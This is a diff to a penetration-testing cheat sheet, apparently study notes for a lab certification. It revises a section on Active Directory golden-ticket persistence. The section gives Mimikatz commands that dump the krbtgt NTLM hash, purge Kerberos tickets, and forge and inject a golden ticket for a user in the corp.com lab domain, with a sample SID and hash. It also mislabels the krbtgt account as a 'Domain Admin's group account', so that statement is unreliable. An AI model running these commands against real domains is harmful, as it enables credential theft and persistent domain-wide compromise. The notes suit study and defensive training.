@@ -420,9 +420,11 @@ ls \\web04\backup
 
 # Persistence 
 
-## Golden Ticket - Pass the Ticket (get our hands on the krbtgt password hash, we could create our own self-made custom TGTs, also known as golden tickets)
+## Golden Ticket - Pass the Ticket (get our hands on the krbtgt password hash and we could create our own self-made custom TGTs, also known as golden tickets)
+outcome: The permission of the user whom we used the krbtgt password hash **will be inherited ** to the current user who we used for lateral movement
+Condition: we first either have access to a **Domain Admin's group account** or to have **compromised the domain controller** itself to work
 
-- Get the NTLM hash of the krbtgt account, along with the domain SID
+- Get the NTLM hash of the krbtgt account (i.e. **Domain Admin's group account**), along with the domain SID
 ```
 ./mimikatz.exe privilege::debug
 ./mimikatz.exe lsadump::lsa /patch
@@ -432,13 +434,13 @@ ls \\web04\backup
 GetDomainsid (PowerView)
 ```
 
-- generate the golden ticket let's launch mimikatz and delete any existing Kerberos tickets
+- delete any existing Kerberos tickets
 ```
 ./mimikatz.exe kerberos::purge
 ```
  
-- Creating a golden ticket using Mimikatz
-```
+- Creating a golden ticket using Mimikatz, so that user jen will be part of the Domain Admin group.
+- ```
 mimikatz.exe kerberos::golden /user:jen /domain:corp.com /sid:S-1-5-21-1987370270-658905905-1781884369 /krbtgt:1693c6cefafffc7af11ef34d1c788f47 /ptt
 ```
 
